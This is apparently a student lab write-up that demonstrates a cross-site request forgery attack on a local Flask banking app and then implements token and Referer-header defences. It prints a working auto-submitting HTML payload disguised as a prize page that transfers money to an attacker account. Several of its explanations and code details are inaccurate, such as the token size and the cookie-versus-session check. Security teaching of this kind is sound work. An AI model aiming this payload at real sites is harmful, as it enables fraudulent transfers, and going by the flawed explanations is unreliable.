# Task 1: normal transaction with CRSF vulnerability

## 1.1: Login, Check balance

We started off by Login into account and checking the balance of the current account.

## 1.2: Doing the transaction

We will have a look at what a normal transaction will do.



This leave us with a big vunerability that if the attacker have the ability to send a fake transaction request to the bank, we will be at risk of being hacked and drain out of money.

## 1.3: Tranfer money illegitimately

Here's what happend if the attacker give us a random link that also steal the login information of the current user and send a fake transaction request to the web server:


Here's what inside the malicious link that the attacker sent:

```

<!DOCTYPE html>
<html>
<body>
<h1>Win a Prize!</h1>
<form id="csrf-form" action="http://localhost:5000/transfer" method="POST" style="display:none;">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="50">
</form>

<script>
    window.onload = function() {
        document.getElementById("csrf-form").submit();
    }
</script>
</body>
</html>

```

This will collect the current login value of the victim and sent a POST request to the web-server to fake a transaction to the attacker balance.

There're ways to counter this attack. Here're some of those:

# Task 2: CSRF Countermeasure implementation

## 2.1: Solution 1: Create a CSRF token generator

This is the simplest method to prevent csrf attack. This method include creating a completely random key called csrf token when a user logged in and use the website. After each POST request, the web server will check if the token inclued in the request is the correct one saved in the cookie. This method is useful in preventing basic csrf attack but still vulnerable when the cookie is stolen. Here's how to implement it:

In the python code base, we create a function to generate random token when the user is logged in:

``` 

def generate_csrf_token(): 
        return secrets.token_hex(16)

```

This will randomly create a 8 bytes token that is completely unknow to the attacker. Since all the value generated will be randomized per client session, this make the attack very difficult to do since we create an unknow element to the login function.

And when the login is successful, we also add to the cookie the generated token with the following line in the initial login funtion:
```

 resp.set_cookie('csrf_token', generate_csrf_token()) 

```
This will, after the user logged in, create a random token and save it into the cookie for future use and validation. Since only the user know what is the generated value, attacker simply cannot use normal csrf method on the website except by directly getting the cookie from the client themself.

After that, we also have to make the change to login to include such csrf token invalid detection, using the following:

```

 def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        submitted_csrf_token = request.form['csrf_token']
        
        # Verify CSRF token
        if submitted_csrf_token != session.get('csrf_token'):
            return "Invalid CSRF token", 403  # Forbidden

```

The previous code is just the authentication for login with extra code for csrf token validation when the web-server is getting a POST request. This will ensure that the csrf token saved in the cookie is correct.

## 2.2: Solution 2: using the referred header method 

This is also a very simple way to prevent basic csrf attack, this involed using a referred website domain as a POST request location, any different POST request header from malicious attacker website will not be resolved in the web server. This is also not a fool-proof method since the header itself is vunerable to attacker. Here's how to implement it in python:

First, we need to check if the POST request contain the request source folder, any POSt request without it will not the resolved:

```

if 'Referer' not in request.headers:
        return "Invalid request (missing Referer header)", 400

```

This will detect if the request header is hidden from the web-server or the attacker use ways to avoid including the header in the request

Then from the request header, we extract the domain and check if that domain match the referred domain of our web server:

```

 referer_domain = request.headers['Referer'].split('/')[2]

    # Check if the domain matches your expected domain
    if referer_domain != 'mysite.com':
        return "Invalid request (Referer does not match)", 400

```

This will extract and check if the header given is the same as the saved domain. Any normal request from clients will always come from the referred domain, and this will prevent csrf attack from happening because the attacker come from different domain.
